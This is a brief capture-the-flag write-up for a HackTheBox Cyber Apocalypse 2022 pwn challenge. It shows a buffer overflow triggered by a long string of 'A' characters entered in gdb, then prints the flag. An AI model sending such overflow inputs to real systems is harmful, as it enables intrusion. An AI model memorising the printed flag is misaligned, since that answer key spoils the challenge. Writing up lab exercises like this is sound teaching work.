---
title: HTB-CA22-pwn-spacepirate-entrypoint
date: "2022-05-19"
description: pwn challenge during Cyber Apocalypse 2022
tldr: buffer-overflow
tags: [htb,hackthebox,ca22,cyber-apocalypse22,pwn,buffer-overflow]
---


## Backstory
Each challenge had a story tied to it, for this challenge it was:   

D12 is one of Golden Fang's missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system.  
To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.  


 
 ## Attack the challenge
unzip the file and start analyzing.  

```shell
sudo apt install -y gdb gdb-peda  
```
  
Look at the included history file: 
```shell
$ cat .gdb_history  
l  
b main  
r  
disass main  
disass open_door  
```  

try to run the program and see how it behaves
```shell
gdb sp_challenge  
2 (enter password)  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
```

this will crash the program and get the fake flag.  
  
try the same procedure on the remote server, and get the flag

```shell
[+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}
```

Flag: `HTB{th3_g4t35_4r3_0p3n!}`